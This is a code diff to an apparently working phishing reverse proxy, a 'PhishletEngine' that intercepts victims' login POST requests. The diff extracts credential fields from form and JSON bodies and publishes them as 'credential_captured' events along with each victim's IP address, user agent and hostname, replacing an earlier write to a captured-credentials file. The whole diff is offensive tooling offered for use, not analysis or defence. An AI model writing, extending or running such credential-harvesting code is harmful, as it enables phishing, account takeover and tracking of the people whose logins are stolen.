@@ -1,5 +1,7 @@
 import yaml
+from core.event_bus import publish_event
 import re
+from datetime import datetime
 import httpx
 import uvicorn
 import logging
@@ -59,7 +61,7 @@ class PhishletEngine:
             logger.error(f"Error processing content: {e}")
             return content
 
-    def capture_credentials(self, path: str, body: bytes):
+    def capture_credentials(self, path: str, body: bytes, request_info: dict):
         try:
             decoded_body = body.decode('utf-8', errors='ignore')
             captured = {}
@@ -77,19 +79,26 @@ class PhishletEngine:
                         if match:
                             captured[field] = match.group(1)
                     # Or JSON
-                    elif f'"{key}"' in decoded_body:
-                         match = re.search(f'"{key}"\s*:\s*"([^"]*)"', decoded_body)
+                    elif f'\"{key}\"' in decoded_body:
+                         match = re.search(f'\"{key}\"\s*:\s*\"([^\"]*)\"', decoded_body)
                          if match:
                              captured[field] = match.group(1)
 
             if captured:
-                log_msg = f"\033[92m[+] CREDENTIALS CAPTURED for {self.name}!\033[0m\nData: {captured}"
+                log_msg = f"\033[92m[+] CREDENTIALS CAPTURED for {self.name}! Publishing event...\033[0m"
                 logger.info(log_msg)
                 print(log_msg) # Ensure it prints to stdout
                 
-                # Save to file
-                with open("captured_credentials.txt", "a") as f:
-                    f.write(f"[{self.name}] Path: {path} | Data: {captured}\n")
+                # Publish event instead of writing to file
+                event_data = {
+                    "phishlet_name": self.name,
+                    "path": path,
+                    "captured_data": captured,
+                    "request_info": request_info,
+                    "timestamp": datetime.now().isoformat()
+                }
+                publish_event('credential_captured', event_data)
+
         except Exception as e:
             logger.error(f"Error capturing credentials: {e}")
     
@@ -157,7 +166,12 @@ async def proxy(request: Request, path: str):
         
         # Check for credential capture on POST
         if request.method == "POST":
-            engine.capture_credentials(f"/{path}", req_body)
+            request_info = {
+                "client_ip": request.client.host,
+                "user_agent": request.headers.get("user-agent", "Unknown"),
+                "hostname": request.url.hostname or "localhost"
+            }
+            engine.capture_credentials(f"/{path}", req_body, request_info)
 
         try:
             proxy_resp = await client.request(
